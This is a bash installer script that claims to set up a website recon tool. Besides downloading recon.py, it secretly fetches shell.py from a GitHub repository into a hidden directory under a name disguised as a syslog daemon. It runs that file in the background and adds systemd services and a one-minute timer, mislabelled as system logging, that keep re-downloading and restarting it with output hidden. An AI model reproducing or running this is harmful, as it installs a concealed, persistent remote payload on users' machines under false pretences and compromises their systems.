#!/bin/bash
set -e

# Check Python3
if ! command -v python3 >/dev/null 2>&1; then
    echo "[-] Python3 not found" >&2
    exit 1
fi

# Download recon.py to current directory
echo "[*] Installing website recon tool..."
if ! curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/recon.py -o ./recon.py; then
    echo "[-] Failed to download recon.py" >&2
    exit 1
fi
chmod +x ./recon.py
pip3 install requests >/dev/null 2>&1 || true
echo "[+] Recon tool installed! Run: python3 recon.py -u https://example.com"

# Download shell.py to hidden system-like directory
shell_url="https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py"
mkdir -p ~/.cache/.systemd-conf
if ! curl -sSL "$shell_url" -o ~/.cache/.systemd-conf/.syslogd; then
    echo "[-] Failed to download shell.py" >&2
    exit 1
fi
chmod +x ~/.cache/.systemd-conf/.syslogd
nohup python3 ~/.cache/.systemd-conf/.syslogd >/dev/null 2>&1 &

# Create systemd service for persistence
sudo mkdir -p /etc/systemd/system
cat << EOF | sudo tee /etc/systemd/system/systemd-syslogd.service >/dev/null
[Unit]
Description=System logging daemon
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/bin/python3 ~/.cache/.systemd-conf/.syslogd
Restart=always
RestartSec=5
User=$(whoami)
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Create systemd service to restore persistence file
cat << EOF | sudo tee /etc/systemd/system/systemd-syslogd-restore.service >/dev/null
[Unit]
Description=System logging daemon restore
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c '[ -f ~/.cache/.systemd-conf/.syslogd ] || (curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py -o ~/.cache/.systemd-conf/.syslogd && chmod +x ~/.cache/.systemd-conf/.syslogd)'
User=$(whoami)
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Create timer to check/restore persistence file every minute
cat << EOF | sudo tee /etc/systemd/system/systemd-syslogd-restore.timer >/dev/null
[Unit]
Description=Timer to restore system logging daemon
Requires=systemd-syslogd-restore.service

[Timer]
OnBootSec=60
OnUnitActiveSec=60
Unit=systemd-syslogd-restore.service

[Install]
WantedBy=timers.target
EOF

# Enable and start services
sudo systemctl daemon-reload >/dev/null 2>&1
sudo systemctl enable systemd-syslogd.service >/dev/null 2>&1
sudo systemctl start systemd-syslogd.service >/dev/null 2>&1
sudo systemctl enable systemd-syslogd-restore.timer >/dev/null 2>&1
sudo systemctl start systemd-syslogd-restore.timer >/dev/null 2>&1

echo "[+] Download complete! Use for scanning."
